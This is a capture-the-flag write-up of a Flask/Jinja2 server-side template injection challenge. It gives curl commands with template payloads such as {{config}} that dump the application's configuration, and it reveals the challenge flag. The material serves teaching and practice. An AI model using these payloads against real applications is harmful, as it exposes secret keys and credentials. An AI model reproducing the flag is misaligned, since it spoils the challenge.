# 7. Tablero del Santuario

**Category**: Web  
**Difficulty**: MEDIUM  
**Points**: 250  

## Description

> El panel de estado del santuario saluda a tu capybara favorito por su nombre. Ese saludo se arma en el servidor de una forma poco cuidadosa. Encuentra la bandera, guardada en la configuración de la aplicación. (No hace falta ejecutar comandos del sistema.)
>
> URL: http://192.99.247.166:8083
>
> **Flag format:** `EVIL{...}`

## Reconnaissance

The main page has a "Saludo personalizado" form that takes a `nombre` parameter via GET to `/saludo`:

```bash
$ curl -s "http://192.99.247.166:8083/saludo?nombre=test"
# Returns "Hola, test"
```

Testing template injection payloads:

```bash
$ curl -s --globoff "http://192.99.247.166:8083/saludo?nombre={{7*7}}"
# No output (empty response)

$ curl -s --globoff "http://192.99.247.166:8083/saludo?nombre=\${7*7}"
# Returns "Hola, $7*7" (literal)

$ curl -s --globoff "http://192.99.247.166:8083/saludo?nombre={{config}}"
# Returns Flask config object including FLAG
```

The `{{...}}` syntax indicates Jinja2 (Flask's default template engine). The empty response for `{{7*7}}` suggests the expression is evaluated but output is filtered or the response is truncated. However, `{{config}}` successfully dumps the Flask application configuration.

## Analysis

The `/saludo` endpoint renders the `nombre` parameter directly in a Jinja2 template without sanitization. This is a Server-Side Template Injection (SSTI) vulnerability.

In Flask/Jinja2, the `config` object contains all application configuration including secret keys and custom variables. The challenge description states "La bandera está guardada en la configuración de la aplicación" (The flag is stored in the application configuration).

Accessing `{{config}}` reveals the FLAG configuration variable.

## Exploitation

```bash
$ curl -s --globoff "http://192.99.247.166:8083/saludo?nombre={{config}}"
```

Response contains:
```html
<h2 style='justify-content:center;'>Hola, <Config {'DEBUG': False, 'TESTING': False, ..., 'FLAG': 'EVIL{ssti_j1nj4_rce_cl4ss1c}'}></h2>
```

Note: `--globoff` is required to prevent curl from interpreting `{}` as glob patterns.

## Flag

```
EVIL{ssti_j1nj4_rce_cl4ss1c}
```

## Key Takeaways

- SSTI in Jinja2/Flask allows access to `config`, `request`, `session`, and other objects
- `{{config}}` is a reliable payload to dump all configuration including secrets
- The challenge explicitly noted no RCE needed - config access was sufficient
- Always sanitize user input before passing to template engines
- Use sandboxed template environments or avoid user-controlled template interpolation

## References

- Jinja2 SSTI: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/ssti-server-side-template-injection
- Flask SSTI config access: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2